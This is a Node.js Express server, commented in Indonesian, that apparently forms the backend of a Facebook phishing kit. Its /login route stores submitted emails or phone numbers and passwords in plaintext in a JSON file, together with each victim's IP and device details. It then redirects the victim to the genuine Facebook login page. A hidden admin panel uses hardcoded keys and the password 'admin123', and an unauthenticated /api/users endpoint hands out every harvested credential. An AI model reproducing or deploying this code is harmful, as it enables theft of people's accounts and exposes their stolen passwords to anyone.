const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const session = require('express-session');
const UAParser = require('ua-parser-js');
const axios = require('axios');

const app = express();
const port = 3000;

// Parsing data dari form login POST
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware untuk parsing data POST
app.use(express.urlencoded({ extended: true }));

// Menetapkan file statis (folder public)
app.use(express.static(path.join(__dirname, '../public')));

// Rute halaman utama
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'views/index.html'));
});

// Rute untuk menangani data login
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toLocaleString('id-ID', {
    year: 'numeric',
    month: 'numeric',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
  });

// Mendapatkan userAgent dari request
const userAgentString = req.headers['user-agent'];

// Parsing userAgent
const agentParser = new UAParser(userAgentString);
const uaResult = agentParser.getResult();

// Informasi yang diformat
const userAgent = {
  device: uaResult.device.vendor || 'Unknown Device',
  model: uaResult.device.model || 'Unknown Model',
  type: uaResult.device.type || 'Unknown Type',
  browser: uaResult.browser.name || 'Unknown Browser',
  os: uaResult.os.name || 'Unknown OS',
};

  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;

// To handle possible IPv6 format (like [::1] or full IPv6 address)
const formattedIp = ip.includes(':') ? ip.split(':').pop() : ip;
  
  // Validasi input
  const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const phoneRegex = /^\+?[0-9]{10,15}$/;
    
    let isValid = true;
    
    if ((!emailRegex.test(email) && !phoneRegex.test(email)) || 
    password.length < 6 || password.length > 50) {
    return res.redirect('/?error=invalid_credentials');
  }
    
    if (isValid) {
   // Data yang akan disimpan
  const data =  {
    email,
    password,
    timestamp,
    userAgent,
    formattedIp
  };
  
  // Path ke file users.json
  const filePath = path.join(__dirname, 'data', 'users.json');
  
  // Simpan data ke file JSON
  fs.readFile(filePath, 'utf-8', (err, fileData) => {
    let jsonData = [];
    if (!err && fileData) {
      // Jika file sudah ada, baca data sebelumnya
      jsonData = JSON.parse(fileData);
    }
    
    // Tambahkan data baru
    jsonData.push(data);
    
    // Tulis kembali data ke file
    fs.writeFile(filePath, JSON.stringify(jsonData, null, 2), (err) => {
      if (err) {
        console.error('Gagal menyimpan data:', err);
        return res.status(500).send('Terjadi kesalahan server');
      }
      
      res.redirect('https://m.facebook.com/login/');
      
    });
  });
  
    }
    
});


// Mengakses login Admin
// Middleware untuk autentikasi login admin
const loginAuth = (req, res, next) => {
  const isAuth = req.query.key === 'saya-admin';
  if (!isAuth) {
    return res.status(403).sendFile(path.join(__dirname, 'views/404.html'));
  }
  next();
};

// Rute halaman login admin
app.get('/admin_login', loginAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'views/login-admin.html'));
});


// Proses login admin
// Konfigurasi session
app.use(
  session({
    secret: 'session_admin',
    resave: false,
    saveUninitialized: true,
    cookie: {
      secure: process.env.NODE_ENV === 'production',
      httpOnly: true,
      maxAge: 3600000,
    },
  })
);

// Middleware untuk autentikasi dan memeriksa session
// const adminMiddleware = (req, res, next) => {
//   const isHeaderAuth = req.headers['x-admin-key'] === 'admin123';
//   const isSessionAuth = req.session.isAdmin;

//   if (!isHeaderAuth || !isSessionAuth) {
//     return res.status(403).send('Access Denied');
//   }
//   next();
// };

// Data admin
const adminCredentials = {
  username: 'admin',
  password: 'admin123',
};

// Rute untuk proses login admin
app.post('/admin_login/admin_panel', (req, res) => {
  const { username, password } = req.body;
  
  // Validasi username dan password admin
  if (username === adminCredentials.username && password === adminCredentials.password) {
    req.session.isAdmin = true; // Tandai sesi sebagai admin
    req.session.adminKey = 'admin123';
    return res.redirect('/admin_login/admin_panel'); // Arahkan ke halaman admin
  }
  
  // Jika login gagal
  res.redirect('/admin_login?error=invalid_credential');
});

// Rute halaman admin panel
app.get('/admin_login/admin_panel', (req, res) => {
  if (req.session.isAdmin && req.session.adminKey === 'admin123') {
    res.sendFile(path.join(__dirname, 'views/panel.html'));
  } else {
    res.status(403).sendFile(path.join(__dirname, 'views/login-admin.html'));
  }
});

// API untuk mendapatkan data pengguna
app.get('/api/users', (req, res) => {
  const filePath = path.join(__dirname, 'data/users.json');
  fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
      return res.status(500).send('Error reading user data');
    }
    res.json(JSON.parse(data));
  });
});

// 404 file not found
app.use((req, res) => {
  res.status(404).sendFile(path.join(__dirname, 'views/404.html'));
});

// Error global
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send('Terjadi kesalahan server.');
});

// Jalankan server
app.listen(port, () => {
  console.log(`http://localhost:${port}`);
});